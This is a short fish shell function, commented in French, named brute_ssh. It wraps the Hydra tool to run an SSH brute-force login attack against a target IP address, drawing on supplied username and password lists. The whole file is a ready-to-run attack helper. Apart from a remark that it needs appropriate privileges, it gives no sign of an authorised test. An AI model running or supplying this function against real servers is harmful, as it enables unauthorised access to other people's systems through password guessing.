function brute_ssh -d "Effectue une attaque par force brute sur SSH"
    # Usage: brute_ssh <target_ip> <user_list> <password_list>
    #
    # Arguments:
    #   target_ip     L'adresse IP de la cible
    #   user_list     Le chemin vers le fichier contenant la liste des utilisateurs
    #   password_list Le chemin vers le fichier contenant la liste des mots de passe
    #
    # Exemple:
    #   brute_ssh 192.168.1.100 users.txt passwords.txt
    #
    # Note: Cette fonction utilise l'outil Hydra et nécessite des privilèges appropriés

    if test (count $argv) -ne 3
        echo "Usage: brute_ssh <target_ip> <user_list> <password_list>"
        return 1
    end

    set -l target_ip $argv[1]
    set -l user_list $argv[2]
    set -l password_list $argv[3]
    
    echo "Lancement de l'attaque par force brute SSH sur $target_ip..."
    hydra -L $user_list -P $password_list ssh://$target_ip
end

